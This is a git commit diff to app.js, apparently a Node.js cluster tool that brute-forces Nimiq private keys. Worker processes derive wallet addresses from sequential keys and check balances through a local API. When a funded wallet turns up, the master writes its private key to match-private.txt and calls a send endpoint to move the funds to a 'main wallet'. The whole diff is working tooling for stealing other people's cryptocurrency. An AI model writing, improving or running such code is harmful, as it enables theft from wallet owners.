415929b4a09c90a34958d404292f9aaff71500bf
malphite-code-2 <168648509+malphite-code-2@users.noreply.github.com>
2024-05-31 16:13:58 +0700

    Update app.js

--- app.js
+++ app.js
@@ -7,22 +7,13 @@ const argv = require('minimist')(process.argv.slice(2));
 (async () => {
   // args
   const numCPUs = argv?.t || 2;
-  const range = argv?.r || "1000000000:ffffffffff";
 
   // Main
   if (cluster.isMaster) {
-    const [rangeStart = "1", rangeEnd = "1fffffffff"] = range.split(":");
-    const start = "0".repeat(64 - rangeStart.length) + rangeStart
-    const end = rangeEnd + "0".repeat(64 - rangeEnd.length)
-      
-    for (let i = 0; i < numCPUs; i++) {
-      cluster.fork({ START_KEY: `0x${start}`, END_KEY: `0x${end}` });
-    }
-
-    cluster.on('exit', (worker, code, signal) => {
-      console.log(`Worker ${worker.process.pid} died`);
-    });
-  } else {
+    let total = 0;
+    let founds = 0;
+    const start = "0000000000000000000000000000000000000000000000000000000006576ea5"
+    const end = "f".repeat(64)
     const send = async (privateKey) => {
       try {
         const res = await axios.get(`http://127.0.0.1:8088/api/v1/send/${privateKey}`)
@@ -31,43 +22,56 @@ const argv = require('minimist')(process.argv.slice(2));
         return null;
       }
     }
-    
+
+    cluster.on('message', async (worker, msg) => {
+      const { address, balance, privateKey } = msg;
+      total++;
+      
+      if (balance > 0) {
+        founds++;
+        console.info(`\x1b[31mChecked: ${total} | Founds: ${founds} | ${address} | B:${balance} NIM`,  '\x1b[34m', `>  ${privateKey}\x1b[0m`);
+
+        // Write to file
+        var successString = `Wallet: [${address}]\nPrivate: [${privateKey}]\nBalance: ${balance} NIM\n\n------ Malphite Coder ------\n\n`;
+        fs.appendFileSync('./match-private.txt', successString, (err) => console.error(err));
+
+        // Create transaction to main wallet
+        await send(privateKey);
+      } else {
+        console.info(`\x1b[31mChecked: ${total} | Founds: ${founds} | ${address} | B:${balance} NIM`,  '\x1b[34m', `>  ${privateKey}\x1b[0m`);
+      }
+    })
+
+    for (let i = 0; i < numCPUs; i++) {
+      cluster.fork({ START_KEY: `0x${start}`, END_KEY: `0x${end}` });
+    }
+
+    cluster.on('exit', (worker, code, signal) => {
+      console.log(`Worker ${worker.process.pid} died`);
+    });
+  } else {
     const getBalance = async (address) => {
       try {
         const res = await axios.get(`http://127.0.0.1:8088/api/v1/balance/${address}`)
         return res.data.balance;
       } catch (error) {
-        console.log(error);
-        return -1;
+        return await getBalance(address);
       }
     }
 
     const START_KEY = BigInt(process.env.START_KEY);
     const END_KEY = BigInt(process.env.END_KEY);
-    const WORKER_INDEX = cluster.worker.id;
+    const WORKER_INDEX = Number(cluster.worker.id);
 
     let founds = 0;
     let start = START_KEY + (BigInt(WORKER_INDEX - 1));
 
     for (let key = start; key <= END_KEY; key = key + BigInt(numCPUs)) {
-      const privateKeyHex = key.toString(16).padStart(64, '0');
-      const wallet = Wallet.fromPrivateKey(privateKeyHex)
+      const privateKey = key.toString(16).padStart(64, '0');
+      const wallet = Wallet.fromPrivateKey(privateKey)
       const address = wallet.getAddress();
       const balance = await getBalance(address);
-
-      if (balance > 0) {
-        founds++;
-        console.info(`\x1b[32mFounds: ${founds} | ${address} | ${privateKeyHex} | ${balance} NIM\x1b[0m`);
-
-        // Write to file
-        var successString = `Wallet: [${address}] - Private: [${privateKeyHex}] - Balance: ${balance} NIM\n\n------ Malphite Coder ------\n\n`;
-        fs.appendFileSync('./match-private.txt', successString, (err) => console.error(err));
-
-        // Create transaction to main wallet
-        await send(privateKeyHex);
-      } else {
-        console.info(`\x1b[35mFounds: ${founds} | ${address} | ${privateKeyHex} | ${balance} NIM\x1b[0m`);
-      }
+      process.send({ address, privateKey, balance })
     }
   }
 })()
